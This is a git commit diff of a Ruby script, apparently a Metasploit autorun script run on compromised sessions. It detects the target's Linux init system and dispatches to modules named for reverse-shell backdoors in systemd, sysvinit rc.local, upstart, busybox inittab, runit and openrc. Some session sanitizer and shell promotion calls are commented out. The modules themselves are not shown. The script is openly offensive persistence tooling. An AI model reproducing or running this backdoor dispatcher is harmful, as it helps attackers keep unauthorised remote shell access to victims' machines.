54b4f2ebd4b9228a87606c637b075076485cb7bc
leandro <38253462+lst15@users.noreply.github.com>
2025-12-12 21:29:07 -0300

    Refactor init type handling and clean up requires
    Updated script to include various init type handlers and removed commented-out session sanitizer and shell promotion calls.

--- main.rb
+++ main.rb
@@ -1,20 +1,43 @@
-require '/home/msf/session_sanitizer'
-require '/home/msf/shell_promotion'
-require '/home/msf/init_detector'
-require '/home/msf/sysvinit_backdoor_rc_local'
+require '/home/msf/msf-autorunscripts/init_detector'
+require '/home/msf/msf-autorunscripts/busyboxx_backdoor_inittab'
+require '/home/msf/msf-autorunscripts/openrc_backdoor_init'
+require '/home/msf/msf-autorunscripts/systemd_backdoor_systemctl'
+require '/home/msf/msf-autorunscripts/sysvinit_backdoor_rc_local'
+require '/home/msf/msf-autorunscripts/upstart_backdoor_conf'
+require '/home/msf/msf-autorunscripts/runit_backdoor_sv'
 
 fm        = client.framework
 target_ip = client.session_host
 sid       = client.sid
 
 print("\n")
-SessionSanitizer.run(fm, target_ip, sid)
+#SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
-ShellPromotion.run(fm, sid, target_ip, client)
+#ShellPromotion.run(fm, sid, target_ip, client)
 print("\n")
-
 init_type = InitDetector.detect(session)
 
+print("\n")
 if init_type == :sysvinit
   RcLocalReverseShell.run(session)
+end
+
+if init_type == :systemd
+    SystemdReverseShell.run(fm, sid, client)
+end
+
+if init_type == :upstart
+    UpstartReverseShell.run(fm, sid, client)
+end
+
+if init_type == :busybox
+    BusyboxInittabReverseShell.run(fm, sid, client)
+end
+
+if init_type == :runit
+    RunitReverseShell.run(fm, sid, client)
+end
+
+if init_type == :openrc
+    OpenrcReverseShell.run(fm, sid, client)
 end
